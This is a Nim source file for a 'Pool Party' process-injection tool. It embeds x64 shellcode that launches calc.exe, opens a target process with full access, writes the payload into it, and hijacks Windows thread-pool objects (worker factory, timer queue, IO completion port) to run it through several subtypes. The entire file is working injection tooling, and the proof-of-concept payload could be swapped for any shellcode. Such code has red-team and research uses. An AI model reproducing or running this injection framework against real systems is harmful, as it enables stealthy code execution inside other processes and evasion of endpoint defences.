import std/[osproc, strformat, strutils]
import winim/lean, argparse

import nimpool, ioinject, timerinject, workinject

const 
  HELPMSG = """Pool Party Injection in Nim:
  Example Usage: ./{prog} -t workerfactory -s startroutine"""

#[ Shellcode ]#
# Nimless nim WinExec("calc.exe") shellcode
var buf: array[279, byte] = [
  byte 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xC7, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
  0x90, 0x57, 0x48, 0x89, 0xCA, 0x56, 0x53, 0x48, 0x81, 0xEC, 0xE0, 0x01, 0x00, 0x00, 0x48,
  0x63, 0x41, 0x3C, 0x48, 0x8D, 0xBC, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x74, 0x01, 
  0x18, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x89, 0xE7, 0x48, 0x8D, 0xB4, 0x24, 
  0xF0, 0x00, 0x00, 0x00, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x63, 0x44, 0x24,
  0x70, 0x48, 0x01, 0xD0, 0x4C, 0x63, 0x40, 0x20, 0x44, 0x8B, 0x58, 0x1C, 0x8B, 0x58, 0x24, 
  0x8B, 0x70, 0x14, 0x31, 0xC0, 0x49, 0x01, 0xD0, 0x39, 0xC6, 0x7E, 0x52, 0x4D, 0x63, 0x08, 
  0xB9, 0xFF, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD1, 0x45, 0x0F, 0xB6, 0x11, 0x49, 0xFF, 0xC1,
  0x45, 0x84, 0xD2, 0x75, 0x15, 0x4C, 0x8D, 0x48, 0x01, 0x49, 0x83, 0xC0, 0x04, 0x81, 0xF9,
  0x32, 0xC5, 0x79, 0x7B, 0x74, 0x0D, 0x4C, 0x89, 0xC8, 0xEB, 0xD0, 0x6B, 0xC9, 0x21, 0x44, 
  0x01, 0xD1, 0xEB, 0xD7, 0x48, 0x01, 0xC0, 0x4C, 0x63, 0xC3, 0x49, 0x63, 0xCB, 0x48, 0x01, 
  0xD0, 0x42, 0x0F, 0xB7, 0x04, 0x00, 0x48, 0x8D, 0x04, 0x82, 0x48, 0x63, 0x04, 0x08, 0x48,
  0x01, 0xD0, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0xE0, 0x01, 0x00, 0x00, 0x5B, 0x5E, 
  0x5F, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x83, 
  0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 
  0xC6, 0x44, 0x24, 0x2F, 0x00, 0x48, 0x89, 0x44, 0x24, 0x27, 0x65, 0x48, 0x8B, 0x04, 0x25, 
  0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 
  0x96, 0x48, 0xAD, 0x48, 0x8B, 0x48, 0x20, 0xE8, 0x05, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 
  0x24, 0x27, 0x31, 0xD2, 0xFF, 0xD0, 0x90, 0xEB, 0xFD
]

let 
  pBuf = buf[0].addr
  bufLen = buf.len

proc initTarget(): HANDLE =
  # Start notepad Process
  let tProcess = startProcess("notepad.exe")
  # Get handle to notepat
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tProcess.processID.DWORD)
  echo &"[&] Starting notepad.exe for testing..."
  echo &" \\__> PID: {tProcess.processID}"
  echo &" \\__> HANDLE: {pHandle}"
  return pHandle

proc openHandleToProcess(pid: int): HANDLE =
  var hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid.DWORD)
  if hProcess != 0:
    return hProcess
  else:
    echo "[!] Failed to open process to PID: ", pid
    return -1

proc handleThreadPoolInjection(pid: int, typ, subtyp: string): bool =
  var 
    pHandle: HANDLE
    hijackHandle1, hijackHandle2: HANDLE
    rPayload: PVOID


  if pid != -1:
    pHandle = openHandleToProcess(pid)
    if pHandle == -1:
      return false
  else:
    pHandle = initTarget()

  if not writePayloadIntoProcess(pHandle, pBuf, bufLen, rPayload.addr):
    return false

  # sleep to improve stability
  sleep(100)

  case typ:
  of "workerfactory":
    hijackHandle1 = hijackProcessWorkerFactory(pHandle)
  of "timer":
    hijackHandle1 = hijackProcessTimerQueue(pHandle)
  of "ioport":
    hijackHandle1 = hijackProcessIoPort(pHandle)
  else:
    echo "[!] Invalid Pool Injection Type"
  
  case subtyp:
  of "work":
    return injectViaTpWork(pHandle, rPayload, hijackHandle1)
  of "startroutine":
    return injectViaWorkerFactoryStartRoutine(pHandle, hijackHandle1, pBuf, bufLen)
  of "wait":
    return injectViaTpWait(pHandle, rPayload, hijackHandle1)
  of "jobobject":
    return injectViaJobCallback(pHandle, rPayload, hijackHandle1)
  of "alpc":
    return injectViaAlpc(pHandle, rPayload, hijackHandle1) 
  of "direct":
    return injectViaTpDirect(pHandle, rPayload, hijackHandle1)
  of "tptimer":
    hijackHandle2 = hijackProcessWorkerFactory(pHandle)
    return injectViaTpTimer(hijackHandle2, hijackHandle1, rPayload, pHandle)
  else:
    echo "[!] Invalid Pool Injection Subtype"

  return true

#[ Main ]#
proc main() =
  var 
    pid: int
    t, s: string

  var p = newParser:
    help(HELPMSG)
    option("-p", "--pid", help="PID of the target process to inject")
    option("-t", "--type", help="Type of pool injection.", choices = @["ioport", "timer", "workerfactory"], required = true)
    option("-s", "--subtype", 
      help="Subtype of the pool injection. [workerfactory: work, startroutine] [ioport: wait, jobobject, alpc, direct] [timer: tptimer]\n\t\t\t    ", 
      choices = @["work", "startroutine", "wait", "jobobject", "alpc", "direct", "tptimer"], required = true)
  
  try:
    var opts = p.parse()
    try:
      pid = opts.pid.parseInt
    except ValueError:
      pid = -1
    t = opts.type
    s = opts.subtype
  except ShortCircuit as e:
    if e.flag == "argparse_help":
      echo e.help
      quit(1)
  except UsageError:
    stderr.writeLine(getCurrentExceptionMsg())
    quit(1)
  
  if handleThreadPoolInjection(pid, t, s):
    echo "[+] Pool Injection Successful"
    quit()
  else:
    echo "[!] Pool Injection Failed"
    quit(1)
  

when isMainModule:
  main()